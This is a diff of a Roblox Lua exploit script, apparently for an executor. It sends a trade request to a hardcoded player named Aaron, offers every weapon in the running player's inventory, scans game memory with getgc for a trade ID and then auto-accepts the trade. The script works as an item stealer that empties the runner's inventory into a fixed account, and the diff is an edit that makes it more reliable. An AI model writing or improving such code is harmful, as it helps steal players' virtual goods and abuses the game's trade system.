@@ -1,4 +1,4 @@
--- Paso 1: Enviar el trade a Aaron (AARON287240) y capturar el ID de la sesión
+-- Paso 1: Enviar el trade a Aaron (AARON287240)
 local targetUserId = 10631566712
 local targetPlayer = nil
 
@@ -14,14 +14,13 @@ if not targetPlayer then
     return
 end
 
--- Intentamos enviar y capturar el ID que devuelve el servidor
-local successSend, currentTradeId = pcall(function()
-    return game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(targetPlayer)
+-- Enviar solicitud
+pcall(function()
+    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(targetPlayer)
 end)
+print("¡Solicitud de trade enviada a Aaron!")
 
-print("¡Solicitud enviada! ID de sesión capturado:", tostring(currentTradeId))
-
--- Esperar a que se abra la ventana de trade
+-- Esperar un momento a que se abra la ventana de intercambio
 task.wait(1.5)
 
 -- Paso 2: Extraer TODAS las armas del inventario
@@ -70,15 +69,32 @@ for _, weaponName in ipairs(weaponsList) do
     pcall(function()
         game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(weaponName, "Weapons")
     end)
-    task.wait(0.12) -- Pausa corta para evitar que sature el servidor
+    task.wait(0.12)
 end
 
 task.wait(0.5)
 
--- Paso 4: Aceptar el trade automáticamente usando el ID y un token de tiempo fresco
+-- Paso 4: Escanear la memoria en busca del ID de trade activo actual y aceptar
+local foundTradeId = nil
+pcall(function()
+    for _, obj in ipairs(getgc(true)) do
+        if type(obj) == "table" then
+            -- Buscamos si hay algún ID numérico de trade o sesión activa en las tablas del juego
+            for k, v in pairs(obj) do
+                if (k == "TradeID" or k == "CurrentTrade" or k == "SessionID") and type(v) == "number" then
+                    foundTradeId = v
+                    break
+                end
+            end
+        end
+        if foundTradeId then break end
+    end
+end)
+
+-- Si no encuentra el ID exacto en la memoria, usamos un respaldo o intentamos aceptar directo
 local acceptArgs = {
-    [1] = type(currentTradeId) == "number" and currentTradeId or 428469873,
-    [2] = os.clock() * 1000 -- Genera un token decimal dinámico basado en el tiempo actual
+    [1] = foundTradeId or 428469873, -- Si lo encuentra lo usa, si no usa el genérico por si el juego lo ignora
+    [2] = os.clock() * 1000
 }
 
 local successAccept, errAccept = pcall(function()
@@ -86,7 +102,7 @@ local successAccept, errAccept = pcall(function()
 end)
 
 if successAccept then
-    print("¡Trade aceptado automáticamente con éxito!")
+    print("¡Proceso completado: Armas ofrecidas y trade aceptado!")
 else
-    warn("Error al auto-aceptar: " .. tostring(errAccept))
+    warn("Aviso al aceptar (las armas ya deberían estar en el trade): " .. tostring(errAccept))
 end
